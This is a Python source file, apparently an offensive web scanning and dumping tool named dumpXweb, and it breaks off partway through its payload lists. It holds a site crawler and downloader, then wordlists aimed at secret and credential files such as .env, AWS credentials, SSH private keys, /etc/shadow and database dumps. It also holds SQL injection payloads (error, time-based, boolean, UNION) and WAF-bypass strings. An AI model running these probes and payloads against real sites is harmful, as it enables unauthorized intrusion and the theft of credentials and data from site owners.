#!/usr/bin/env python3
#by denzyx | 1.0 version
import os
import sys
import re
import json
import time
import signal
import socket
import ssl
import base64
import hashlib
import hmac
import threading
import zipfile
import random
import string
import ipaddress
import html as html_lib
import subprocess
from pathlib import Path
from collections import deque, defaultdict
from urllib.parse import (
    urljoin, urlparse, unquote, quote,
    urlencode, parse_qs, urlsplit, urlunsplit
)
from urllib.request import (
    Request, urlopen, build_opener,
    HTTPCookieProcessor
)
from urllib.error import HTTPError, URLError
from http.cookiejar import CookieJar
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

#colors
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BRIGHT_RED = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_YELLOW = "\033[93m"
BRIGHT_BLUE = "\033[94m"
BRIGHT_MAGENTA = "\033[95m"
BRIGHT_CYAN = "\033[96m"
BRIGHT_WHITE = "\033[97m"

#config
VERSION = "1.0"
CODENAME = "Apocalypse"
AUTHOR = "denzyx"

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)

DEFAULT_TIMEOUT = 12
MAX_THREADS = 20
MAX_DEPTH = 15
DEFAULT_DELAY = 0.35

AUTO_POC_ENABLED = True
AUTO_POC_PROMPT = True
AUTO_POC_SAFE_MODE = True

#global state
STOP = False
FINDINGS = []
SESSION_COOKIES = CookieJar()

SCAN_STATS = {
    "requests": 0,
    "start_time": None,
    "errors": 0,
    "vulns": 0
}

SEVERITY_COLORS = {
    "CRITICAL": BRIGHT_RED,
    "HIGH": BRIGHT_RED,
    "MEDIUM": BRIGHT_YELLOW,
    "LOW": BRIGHT_BLUE,
    "INFO": BRIGHT_CYAN
}

SEVERITY_SCORES = {
    "CRITICAL": 10,
    "HIGH": 8,
    "MEDIUM": 5,
    "LOW": 3,
    "INFO": 1
}

PATH_PRESETS = {
    "1": ("~/storage/shared/dumpXweb", "Termux default"),
    "2": ("~/storage/shared/Download", "Termux Download"),
    "3": ("~/storage/shared/Documents", "Termux Documents"),
    "4": ("/sdcard/dumpXweb", "Android SD card"),
    "5": ("/tmp/dumpXweb", "Linux tmp"),
    "6": ("./dumpXweb_output", "Current dir"),
    "7": ("CUSTOM", "Custom path")
}

FILE_TYPES = {
    "1":  ("JPG / JPEG", {".jpg", ".jpeg"}),
    "2":  ("PNG", {".png"}),
    "3":  ("GIF", {".gif"}),
    "4":  ("WEBP", {".webp"}),
    "5":  ("SVG", {".svg"}),
    "6":  ("CSS", {".css"}),
    "7":  ("JavaScript", {".js"}),
    "8":  ("JSON", {".json"}),
    "9":  ("PDF", {".pdf"}),
    "10": ("ZIP / Archive", {".zip", ".tar", ".gz", ".7z"}),
    "11": ("Semua asset umum", {
        ".jpg", ".jpeg", ".png", ".gif", ".webp",
        ".svg", ".bmp", ".ico", ".avif",
        ".css", ".js", ".json", ".xml",
        ".pdf", ".txt", ".csv",
        ".zip", ".tar", ".gz", ".7z",
        ".woff", ".woff2", ".ttf", ".otf",
        ".mp3", ".wav", ".ogg",
        ".mp4", ".webm"
    })
}

SIZE_LIMITS = {
    "1": ("5 MB", 5 * 1024 * 1024),
    "2": ("10 MB", 10 * 1024 * 1024),
    "3": ("25 MB", 25 * 1024 * 1024),
    "4": ("50 MB", 50 * 1024 * 1024),
    "5": ("100 MB", 100 * 1024 * 1024),
    "6": ("Tanpa batas", None)
}

#signal
def handle_sigint(signum, frame):
    global STOP
    STOP = True
    print(f"\n\n{BRIGHT_YELLOW}[!] Stopping...{RESET}")


signal.signal(signal.SIGINT, handle_sigint)

#ui_helpers
def clear():
    os.system("clear" if os.name != "nt" else "cls")


def title(text):
    print()
    print(f"{BRIGHT_CYAN}{'-' * 60}{RESET}")
    print(f"{BOLD}{BRIGHT_WHITE}{text}{RESET}")
    print(f"{BRIGHT_CYAN}{'-' * 60}{RESET}")


def info(text):
    print(f"{BRIGHT_CYAN}[i]{RESET} {text}")


def success(text):
    print(f"{BRIGHT_GREEN}[+]{RESET} {text}")


def warning(text):
    print(f"{BRIGHT_YELLOW}[!]{RESET} {text}")


def error(text):
    print(f"{BRIGHT_RED}[-]{RESET} {text}")


def critical(text):
    print(f"{BRIGHT_RED}{BOLD}[!]{RESET} {BRIGHT_RED}{text}{RESET}")


def ask(text):
    return input(f"{BRIGHT_MAGENTA}[?]{RESET} {text}").strip()


def ask_choice(text, choices, default=None):
    while True:
        raw = ask(text)
        if not raw and default is not None:
            return default
        if raw in choices:
            return raw
        warning(f"Invalid. Choices: {', '.join(choices)}")


def spinner(text, duration=0.8):
    chars = ["|", "/", "-", "\\"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        print(f"\r{BRIGHT_CYAN}{chars[i % len(chars)]}{RESET} {text}",
              end="", flush=True)
        time.sleep(0.08)
        i += 1
    print(f"\r{BRIGHT_GREEN}[+]{RESET} {text}")


def slow_print(text, delay=0.015):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()


def banner():
    clear()
    print(BRIGHT_CYAN + r"""
        ____  _   _ __  __ ____  __  __
       |  _ \| | | |  \/  |  _ \ \ \/ /
       | | | | | | | |\/| | |_) | \  /
       | |_| | |_| | |  | |  __/  /  \
       |____/ \___/|_|  |_|_|    /_/\_\

        dumpXweb v1.0 - Apocalypse
    """ + RESET)
    print(f"        Author  : {AUTHOR}")
    print(f"        Version : {VERSION} ({CODENAME})")
    print()


#finding management 
def add_finding(sev, category, url, detail, evidence="", remediation=""):
    FINDINGS.append({
        "severity": sev,
        "category": category,
        "url": url,
        "detail": detail,
        "evidence": str(evidence)[:2000],
        "remediation": remediation,
        "timestamp": datetime.now().isoformat()
    })
    color = SEVERITY_COLORS.get(sev, BRIGHT_WHITE)
    print(f"{color}[{sev}]{RESET} {category} - {url}")
    if detail:
        print(f"        {DIM}{detail}{RESET}")
    if sev in ("CRITICAL", "HIGH"):
        SCAN_STATS["vulns"] += 1


def confirm_next_cancel(vuln_type, url, evidence):
    print()
    print(f"{BRIGHT_RED}{'=' * 60}{RESET}")
    print(f"{BRIGHT_RED}{BOLD}  CRITICAL FINDING DETECTED{RESET}")
    print(f"{BRIGHT_RED}{'=' * 60}{RESET}")
    print(f"{BRIGHT_CYAN}Type     :{RESET} {vuln_type}")
    print(f"{BRIGHT_CYAN}URL      :{RESET} {url}")
    print(f"{BRIGHT_CYAN}Evidence :{RESET} {str(evidence)[:200]}")
    print(f"{BRIGHT_RED}{'=' * 60}{RESET}")
    print(f"{BRIGHT_YELLOW}[1]{RESET} NEXT   - Continue operation")
    print(f"{BRIGHT_YELLOW}[2]{RESET} SKIP   - Skip this finding")
    print(f"{BRIGHT_YELLOW}[3]{RESET} CANCEL - Abort entire operation")
    choice = ask_choice("Choice [1/2/3]: ", ["1", "2", "3"], "2")
    return {"1": "next", "2": "skip", "3": "cancel"}[choice]


#path & selection
def choose_result_path():
    title("PILIH PATH HASIL SCAN")
    for key, (path, desc) in PATH_PRESETS.items():
        print(f"{BRIGHT_YELLOW}[{key}]{RESET} {desc}")
        if path != "CUSTOM":
            print(f"     {DIM}{os.path.expanduser(path)}{RESET}")
    print()
    while True:
        choice = ask_choice("Pilih [1-7]: ",
                            ["1", "2", "3", "4", "5", "6", "7"], "1")
        if choice == "7":
            custom = ask("Path custom: ").strip()
            if custom:
                p = Path(os.path.expanduser(custom))
                try:
                    p.mkdir(parents=True, exist_ok=True)
                    success(f"Path: {p}")
                    return p
                except Exception as e:
                    error(f"Fail: {e}")
                    continue
            continue
        path, _ = PATH_PRESETS[choice]
        p = Path(os.path.expanduser(path))
        try:
            p.mkdir(parents=True, exist_ok=True)
            success(f"Path: {p}")
            return p
        except Exception as e:
            error(f"Fail: {e}")
            continue


def choose_report_name(prefix="dumpXweb"):
    title("NAMA FILE REPORT")
    default = f"{prefix}_{time.strftime('%Y%m%d_%H%M%S')}"
    print(f"Default: {BRIGHT_CYAN}{default}{RESET}")
    print(f"{BRIGHT_YELLOW}[1]{RESET} Pakai default")
    print(f"{BRIGHT_YELLOW}[2]{RESET} Custom")
    choice = ask_choice("Pilih [1/2]: ", ["1", "2"], "1")
    if choice == "1":
        return default
    name = ask("Nama (tanpa ekstensi): ").strip()
    if not name:
        return default
    return re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)[:100]

#url helpers
def normalize_url(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    parsed = urlparse(url)
    if not parsed.hostname:
        raise ValueError("Invalid URL")
    return parsed._replace(fragment="").geturl()


def safe_name(name):
    name = unquote(name)
    name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)
    return name.strip(" .")[:220] or "index"


def url_path(url):
    parsed = urlparse(url)
    path = unquote(parsed.path) or "/"
    if path.endswith("/"):
        path += "index.html"
    parts = [safe_name(x) for x in path.split("/") if x]
    return Path(*parts) if parts else Path("index.html")


def host_of(url):
    return (urlparse(url).hostname or "").lower()


def same_host(a, b):
    return host_of(a) == host_of(b)


def extension(url):
    return Path(urlparse(url).path.lower()).suffix


def human_size(value):
    if value is None:
        return "0 B"
    units = ["B", "KB", "MB", "GB", "TB"]
    size = float(value)
    for unit in units:
        if size < 1024:
            return f"{size:.2f} {unit}"
        size /= 1024
    return f"{size:.2f} PB"

#http helpers
def http_get(url, timeout=DEFAULT_TIMEOUT, headers=None, cookies=None):
    SCAN_STATS["requests"] += 1
    h = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "identity",
        "Connection": "close"
    }
    if headers:
        h.update(headers)
    req = Request(url, headers=h)
    try:
        opener = build_opener(HTTPCookieProcessor(cookies or SESSION_COOKIES))
        resp = opener.open(req, timeout=timeout)
        return resp.getcode(), dict(resp.headers), resp.read(), resp.geturl()
    except HTTPError as e:
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return e.code, dict(e.headers) if e.headers else {}, body, url
    except Exception:
        SCAN_STATS["errors"] += 1
        return 0, {}, b"", url


def http_post(url, data, timeout=DEFAULT_TIMEOUT, headers=None):
    SCAN_STATS["requests"] += 1
    h = {"User-Agent": USER_AGENT,
         "Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        h.update(headers)
    body = urlencode(data).encode() if isinstance(data, dict) else data
    req = Request(url, data=body, headers=h)
    try:
        opener = build_opener(HTTPCookieProcessor(SESSION_COOKIES))
        resp = opener.open(req, timeout=timeout)
        return resp.getcode(), dict(resp.headers), resp.read()
    except HTTPError as e:
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return e.code, dict(e.headers) if e.headers else {}, body
    except Exception:
        SCAN_STATS["errors"] += 1
        return 0, {}, b""


def http_request(url, method="GET", headers=None, data=None,
                 timeout=DEFAULT_TIMEOUT):
    SCAN_STATS["requests"] += 1
    h = {"User-Agent": USER_AGENT}
    if headers:
        h.update(headers)
    body = None
    if data:
        body = urlencode(data).encode() if isinstance(data, dict) else data
    req = Request(url, data=body, headers=h, method=method)
    try:
        opener = build_opener(HTTPCookieProcessor(SESSION_COOKIES))
        resp = opener.open(req, timeout=timeout)
        return resp.getcode(), dict(resp.headers), resp.read(), resp.geturl()
    except HTTPError as e:
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return e.code, dict(e.headers) if e.headers else {}, body, url
    except Exception:
        return 0, {}, b"", url

#link helpers
class LinkParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.links = set()
        self.forms = []
        self.scripts = set()
        self.styles = set()
        self.images = set()
        self.emails = set()
        self.comments = []
        self.meta = []
        self.hidden_inputs = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        targets = []
        for key in ("href", "src", "data-src", "data-href",
                    "action", "formaction", "poster"):
            if key in attrs:
                targets.append(attrs[key])
        if "srcset" in attrs:
            for item in attrs["srcset"].split(","):
                v = item.strip().split(" ")[0]
                if v:
                    targets.append(v)
        if tag == "meta" and "content" in attrs:
            self.meta.append(attrs)
            if attrs.get("name") == "generator":
                self.meta.append(("generator", attrs["content"]))
        for target in targets:
            if not target:
                continue
            target = target.strip()
            if target.startswith(("javascript:", "mailto:", "data:", "tel:", "#")):
                if target.startswith("mailto:"):
                    self.emails.add(target.replace("mailto:", "").split("?")[0])
                continue
            try:
                absolute = urljoin(self.base_url, target)
                if urlparse(absolute).scheme in ("http", "https"):
                    self.links.add(absolute.split("#")[0])
            except Exception:
                pass
        if tag == "script" and "src" in attrs:
            try:
                self.scripts.add(urljoin(self.base_url, attrs["src"]))
            except Exception:
                pass
        if tag == "link" and attrs.get("rel") == "stylesheet":
            if "href" in attrs:
                self.styles.add(urljoin(self.base_url, attrs["href"]))
        if tag == "img" and "src" in attrs:
            try:
                self.images.add(urljoin(self.base_url, attrs["src"]))
            except Exception:
                pass
        if tag == "form":
            action = attrs.get("action", "")
            method = attrs.get("method", "GET").upper()
            self.forms.append({
                "action": urljoin(self.base_url, action) if action else self.base_url,
                "method": method,
                "inputs": []
            })
        if tag in ("input", "textarea", "select") and self.forms:
            inp = {
                "tag": tag,
                "name": attrs.get("name", ""),
                "type": attrs.get("type", "text"),
                "value": attrs.get("value", ""),
                "id": attrs.get("id", ""),
                "placeholder": attrs.get("placeholder", "")
            }
            self.forms[-1]["inputs"].append(inp)
            if inp["type"] == "hidden" and inp["name"]:
                self.hidden_inputs.append(inp)

    def handle_comment(self, data):
        if data.strip():
            self.comments.append(data.strip())

    def handle_data(self, data):
        for m in re.findall(r"[\w\.-]+@[\w\.-]+\.\w+", data):
            self.emails.add(m)


#dumper
class Dumper:
    def __init__(self, target, output, extensions, max_size, max_depth=20):
        self.target = normalize_url(target)
        self.root_host = host_of(self.target)
        self.output = Path(output)
        self.extensions = extensions
        self.max_size = max_size
        self.max_depth = max_depth
        self.queue = deque()
        self.visited = set()
        self.results = []
        self.errors = []
        self.total_bytes = 0
        self.downloaded = 0
        self.skipped_size = 0
        self.started = time.time()
        self.output.mkdir(parents=True, exist_ok=True)

    def request(self, url):
        headers = {"User-Agent": USER_AGENT, "Accept": "*/*"}
        request = Request(url, headers=headers)
        try:
            response = urlopen(request, timeout=DEFAULT_TIMEOUT)
            content_type = response.headers.get("Content-Type", "")
            length = response.headers.get("Content-Length")
            if length:
                try:
                    size = int(length)
                    if self.max_size is not None and size > self.max_size:
                        self.skipped_size += 1
                        warning(f"SKIP SIZE {human_size(size)} {url}")
                        return None
                except ValueError:
                    pass
            body = response.read()
            if self.max_size is not None and len(body) > self.max_size:
                self.skipped_size += 1
                warning(f"SKIP SIZE {human_size(len(body))} {url}")
                return None
            return content_type, body
        except HTTPError as e:
            self.errors.append({"url": url, "error": f"HTTP {e.code}"})
            error(f"HTTP {e.code} {url}")
        except URLError as e:
            self.errors.append({"url": url, "error": str(e.reason)})
            error(f"{url} -> {e.reason}")
        except Exception as e:
            self.errors.append({"url": url, "error": str(e)})
            error(f"{url} -> {e}")
        return None

    def save(self, url, body):
        relative = url_path(url)
        destination = self.output / relative
        destination.parent.mkdir(parents=True, exist_ok=True)
        if destination.exists():
            stem = destination.stem
            suffix = destination.suffix
            counter = 1
            while destination.exists():
                destination = destination.parent / f"{stem}_{counter}{suffix}"
                counter += 1
        with open(destination, "wb") as file:
            file.write(body)
        size = len(body)
        self.downloaded += 1
        self.total_bytes += size
        self.results.append({
            "url": url,
            "file": str(destination.relative_to(self.output)),
            "size": size
        })
        return destination

    def process(self):
        self.queue.append((self.target, 0))
        while self.queue and not STOP:
            url, depth = self.queue.popleft()
            if url in self.visited:
                continue
            if depth > self.max_depth:
                continue
            if not same_host(url, self.root_host):
                continue
            self.visited.add(url)
            print(f"\n{BRIGHT_BLUE}[{len(self.visited)}]{RESET} {url}")
            result = self.request(url)
            if result is None:
                continue
            content_type, body = result
            ext = extension(url)
            is_html = ("text/html" in content_type.lower()
                       or ext in ("", ".html", ".htm"))
            if is_html:
                try:
                    text = body.decode("utf-8", errors="ignore")
                except Exception:
                    text = ""
                parser = LinkParser(url)
                try:
                    parser.feed(text)
                except Exception:
                    parser.links = set()
                links = parser.links
                if (".html" in self.extensions
                        or ".htm" in self.extensions
                        or not self.extensions):
                    self.save(url, body)
                for link in links:
                    if not same_host(link, self.root_host):
                        continue
                    if link in self.visited:
                        continue
                    link_ext = extension(link)
                    if not link_ext or link_ext in self.extensions:
                        self.queue.append((link, depth + 1))
                continue
            if ext in self.extensions:
                destination = self.save(url, body)
                success(f"{human_size(len(body))} {destination}")
            else:
                info(f"Skip extension: {ext or '[none]'}")

    def report(self):
        report = {
            "tool": "xweb",
            "version": VERSION,
            "author": AUTHOR,
            "target": self.target,
            "host": self.root_host,
            "started": time.strftime("%Y-%m-%d %H:%M:%S"),
            "visited": len(self.visited),
            "downloaded": self.downloaded,
            "bytes": self.total_bytes,
            "size": human_size(self.total_bytes),
            "skipped_size": self.skipped_size,
            "errors": self.errors,
            "files": self.results
        }
        path = self.output / "report.json"
        with open(path, "w", encoding="utf-8") as file:
            json.dump(report, file, indent=2, ensure_ascii=False)
        return path

    def make_zip(self):
        zip_path = self.output.parent / f"{self.output.name}.zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
            for file in self.output.rglob("*"):
                if file.is_file():
                    archive.write(file, file.relative_to(self.output))
        return zip_path

#payload_db
COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389,
    443, 445, 465, 514, 587, 636, 873, 993, 995, 1080, 1433,
    1521, 1723, 2049, 2082, 2083, 2086, 2087, 2181, 2222,
    2375, 2376, 3000, 3128, 3306, 3389, 3690, 4000, 4443,
    4848, 5000, 5432, 5672, 5900, 5984, 6379, 6443, 7001,
    7002, 7070, 7443, 8000, 8008, 8080, 8081, 8082, 8086,
    8088, 8090, 8161, 8443, 8500, 8888, 8983, 9000, 9001,
    9042, 9090, 9092, 9200, 9300, 9418, 9443, 10000,
    10250, 10255, 11211, 15672, 16379, 27017, 27018,
    50000, 50070, 50075
]

COMMON_SUBDOMAINS = [
    "www", "mail", "smtp", "pop", "imap", "webmail", "mx", "ns",
    "ns1", "ns2", "dns", "dns1", "dns2", "ftp", "sftp", "ssh",
    "vpn", "remote", "rdp", "admin", "administrator", "cpanel",
    "whm", "webdisk", "cpcalendars", "cpcontacts", "portal",
    "dashboard", "panel", "manage", "management", "api", "api-v1",
    "api-v2", "graphql", "rest", "ws", "wss", "socket", "cdn",
    "static", "assets", "img", "images", "media", "video", "files",
    "download", "downloads", "upload", "uploads", "dev", "develop",
    "developer", "development", "test", "testing", "stage", "staging",
    "prod", "production", "beta", "alpha", "demo", "sandbox", "qa",
    "uat", "preview", "blog", "news", "forum", "community", "shop",
    "store", "cart", "checkout", "pay", "payment", "billing",
    "invoice", "crm", "erp", "hr", "employee", "staff", "internal",
    "intranet", "extranet", "partner", "vendor", "client", "customer",
    "support", "help", "helpdesk", "ticket", "status", "monitor",
    "monitoring", "metrics", "stats", "analytics", "log", "logs",
    "git", "gitlab", "github", "bitbucket", "svn", "jenkins",
    "ci", "cd", "build", "deploy", "docker", "registry", "k8s",
    "kube", "kubernetes", "swarm", "proxy", "gateway", "router",
    "firewall", "waf", "load", "lb", "balance", "backup", "bak",
    "old", "new", "v1", "v2", "v3", "legacy", "archive"
]

COMMON_PATHS = [
    "/admin", "/admin/", "/admin/login", "/admin.php", "/admin.html",
    "/login", "/login.php", "/login.html", "/signin", "/signup",
    "/register", "/logout", "/wp-admin", "/wp-login.php",
    "/wp-content", "/wp-includes", "/wp-json", "/xmlrpc.php",
    "/administrator", "/joomla", "/drupal", "/typo3",
    "/phpmyadmin", "/pma", "/myadmin", "/mysql", "/adminer.php",
    "/.git/config", "/.git/HEAD", "/.git/index", "/.svn/entries",
    "/.hg/store", "/.bzr/branch-format",
    "/.env", "/.env.local", "/.env.dev", "/.env.prod",
    "/.env.production", "/.env.development", "/.env.test",
    "/config.php", "/config.php.bak", "/config.php~",
    "/configuration.php", "/config.json", "/config.yaml",
    "/config.yml", "/config.xml", "/config.ini", "/config.cfg",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.txt",
    "/settings.py", "/settings.php", "/local_settings.py",
    "/.htaccess", "/.htpasswd", "/.htaccess.bak",
    "/web.config", "/appsettings.json", "/appsettings.Development.json",
    "/backup", "/backup.zip", "/backup.tar.gz", "/backup.tar",
    "/backup.sql", "/backup.rar", "/backup.7z", "/backups",
    "/db.sql", "/dump.sql", "/database.sql", "/data.sql",
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/humans.txt", "/security.txt", "/.well-known/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3",
    "/api/docs", "/api/swagger", "/api/swagger.json",
    "/swagger", "/swagger.json", "/swagger.yaml", "/swagger-ui",
    "/swagger-ui.html", "/openapi.json", "/openapi.yaml",
    "/graphql", "/graphiql", "/graphql/console", "/playground",
    "/api/graphql", "/v1/graphql", "/graphql.php",
    "/server-status", "/server-info", "/status", "/health",
    "/healthz", "/healthcheck", "/ping", "/version", "/info",
    "/phpinfo.php", "/info.php", "/test.php", "/php.php",
    "/test", "/testing", "/dev", "/development", "/stage",
    "/staging", "/prod", "/production", "/beta", "/alpha",
    "/demo", "/sample", "/example", "/old", "/new", "/temp",
    "/tmp", "/cache", "/private", "/internal", "/secret",
    "/hidden", "/confidential", "/restricted",
    "/package.json", "/composer.json", "/Gemfile", "/requirements.txt",
    "/Pipfile", "/pom.xml", "/build.gradle", "/Cargo.toml",
    "/go.mod", "/yarn.lock", "/package-lock.json",
    "/.DS_Store", "/Thumbs.db", "/desktop.ini",
    "/.dockerignore", "/Dockerfile", "/docker-compose.yml",
    "/.github/workflows", "/.gitlab-ci.yml", "/.travis.yml",
    "/Jenkinsfile", "/.circleci/config.yml",
    "/.aws/credentials", "/.aws/config", "/.ssh/id_rsa",
    "/.ssh/authorized_keys", "/.ssh/known_hosts",
    "/.kube/config", "/.npmrc", "/.pypirc", "/.netrc",
    "/.bash_history", "/.zsh_history", "/.mysql_history",
    "/.psql_history", "/.rediscli_history",
    "/proc/self/environ", "/proc/self/cmdline",
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/webdav", "/dav", "/cgi-bin", "/cgi-bin/test.cgi",
    "/shell", "/shell.php", "/cmd", "/cmd.php", "/exec",
    "/upload", "/uploads", "/files", "/download", "/downloads",
    "/media", "/assets", "/static", "/public", "/private",
    "/logs", "/log", "/error_log", "/access_log", "/debug.log",
    "/console", "/terminal", "/cli", "/cmdline", "/run"
]

SENSITIVE_FILES = [
    "/.git/config", "/.git/HEAD", "/.git/index", "/.git/logs/HEAD",
    "/.svn/entries", "/.svn/wc.db", "/.hg/store", "/.bzr/branch-format",
    "/.env", "/.env.local", "/.env.dev", "/.env.prod",
    "/.env.production", "/.env.development", "/.env.test",
    "/.env.backup", "/.env.bak", "/.env.old",
    "/config.php", "/config.php.bak", "/config.php.old",
    "/config.php~", "/config.php.swp", "/config.inc.php",
    "/configuration.php", "/wp-config.php", "/wp-config.php.bak",
    "/wp-config.txt", "/settings.py", "/local_settings.py",
    "/config.json", "/config.yaml", "/config.yml", "/config.xml",
    "/config.ini", "/config.cfg", "/config.toml",
    "/web.config", "/appsettings.json", "/appsettings.Development.json",
    "/.htaccess", "/.htpasswd", "/.htaccess.bak",
    "/backup.zip", "/backup.tar.gz", "/backup.tar", "/backup.rar",
    "/backup.7z", "/backup.sql", "/db.sql", "/dump.sql",
    "/database.sql", "/data.sql", "/mysql.sql", "/pg.sql",
    "/phpinfo.php", "/info.php", "/test.php", "/php.php",
    "/.DS_Store", "/Thumbs.db", "/desktop.ini",
    "/package.json", "/composer.json", "/Gemfile",
    "/requirements.txt", "/Pipfile", "/pom.xml",
    "/build.gradle", "/Cargo.toml", "/go.mod",
    "/.aws/credentials", "/.aws/config", "/.ssh/id_rsa",
    "/.ssh/id_dsa", "/.ssh/id_ecdsa", "/.ssh/id_ed25519",
    "/.ssh/authorized_keys", "/.kube/config", "/.npmrc",
    "/.pypirc", "/.netrc", "/.bash_history", "/.zsh_history",
    "/swagger.json", "/openapi.json", "/swagger.yaml",
    "/server-status", "/server-info", "/nginx_status",
    "/.well-known/security.txt", "/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/elmah.axd", "/trace.axd", "/WebResource.axd",
    "/Dockerfile", "/docker-compose.yml", "/.dockerignore",
    "/Jenkinsfile", "/.travis.yml", "/.gitlab-ci.yml",
    "/.circleci/config.yml", "/.github/workflows/main.yml",
    "/phpMyAdmin", "/pma", "/adminer.php", "/adminer",
    "/.s3cfg", "/.boto", "/credentials", "/.gem/credentials",
    "/.vscode/sftp.json", "/.idea/workspace.xml",
    "/.ftpconfig", "/ftpconfig.json", "/.remote-sync.json"
]

SQLI_ERROR_PAYLOADS = [
    "'", "\"", "')", "\")", "';", "\";",
    "'--", "\"--", "'#", "\"#",
    "1'", "1\"", "1)", "1))",
    "' OR '1", "\" OR \"1",
    "' AND '1", "\" AND \"1",
    "admin'--", "admin'#", "admin'/*",
    "' OR 1=1--", "' OR 1=1#",
    "\" OR 1=1--", "\" OR 1=1#",
    "') OR ('1'='1", "\") OR (\"1\"=\"1",
    "1' AND '1'='1", "1' AND '1'='2"
]

SQLI_ERROR_SIGNATURES = [
    "SQL syntax", "mysql_fetch", "mysql_num_rows",
    "mysql_query", "mysqli_", "You have an error in your SQL",
    "Warning: mysql", "PostgreSQL", "pg_query",
    "pg_exec", "pg_prepare", "ORA-", "Oracle",
    "Microsoft OLE DB", "ODBC SQL Server", "SQLServer JDBC",
    "SQLite/JDBCDriver", "SQLite.Exception",
    "System.Data.SQLite", "unclosed quotation mark",
    "Incorrect syntax near", "Microsoft Access Driver",
    "JET Database Engine", "Syntax error in query expression",
    "Unknown column", "Table '", "doesn't exist",
    "Unknown database", "supplied argument is not a valid",
    "mysql_result()", "mysql_numrows()", "num_rows",
    "pg_fetch_array", "pg_fetch_assoc",
    "valid MySQL result", "MariaDB", "SQLSTATE",
    "Division by zero", "ODBC Driver", "JDBC Driver"
]

SQLI_TIME_PAYLOADS = [
    ("1' AND SLEEP(5)--", 5),
    ("1' AND SLEEP(5)#", 5),
    ("1 AND SLEEP(5)", 5),
    ("1 AND SLEEP(5)--", 5),
    ("1'; WAITFOR DELAY '0:0:5'--", 5),
    ("1'; WAITFOR DELAY '0:0:5'#", 5),
    ("1; SELECT pg_sleep(5)--", 5),
    ("1' AND pg_sleep(5)--", 5),
    ("1' AND pg_sleep(5)#", 5),
    ("1' AND BENCHMARK(5000000,MD5(1))--", 5),
    ("1' OR SLEEP(5) AND '1'='1", 5),
    ("1' OR SLEEP(5)#", 5),
    ("1) OR SLEEP(5)--", 5),
    ("1)) OR SLEEP(5)--", 5)
]

SQLI_BOOLEAN_PAYLOADS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"),
    ("1) AND (1=1", "1) AND (1=2"),
    ("1' AND (SELECT 1)='1", "1' AND (SELECT 1)='2"),
    ("1 AND 1 LIKE 1", "1 AND 1 LIKE 2"),
    ("1' AND 'a'='a", "1' AND 'a'='b"),
    ("1 AND 1 BETWEEN 0 AND 2", "1 AND 1 BETWEEN 2 AND 3"),
    ("1' AND 'x'='x", "1' AND 'x'='y")
]

SQLI_UNION_PAYLOADS = [
    ("1 UNION SELECT NULL", 1),
    ("1 UNION SELECT NULL,NULL", 2),
    ("1 UNION SELECT NULL,NULL,NULL", 3),
    ("1 UNION SELECT NULL,NULL,NULL,NULL", 4),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL", 5),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL", 6),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL", 7),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL", 8),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL", 9),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL", 10),
    ("-1 UNION SELECT NULL", 1),
    ("-1 UNION SELECT NULL,NULL", 2),
    ("-1 UNION SELECT NULL,NULL,NULL", 3),
    ("0 UNION SELECT NULL", 1),
    ("' UNION SELECT NULL--", 1),
    ("' UNION SELECT NULL,NULL--", 2),
    ("' UNION SELECT NULL,NULL,NULL--", 3),
    ("' UNION SELECT NULL,NULL,NULL,NULL--", 4),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", 5),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", 6),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--", 7),
    ("\" UNION SELECT NULL--", 1),
    ("') UNION SELECT NULL--", 1),
    ("1 UNION SELECT 1,2,3--", 3),
    ("1 UNION SELECT 1,2,3,4--", 4),
    ("1 UNION ALL SELECT NULL--", 1)
]

SQLI_WAF_BYPASS = [
    "/*!50000UNION*/", "/*!50000SELECT*/",
    "UN/**/ION", "UN%0aION", "UN%0dION", "UN%09ION",
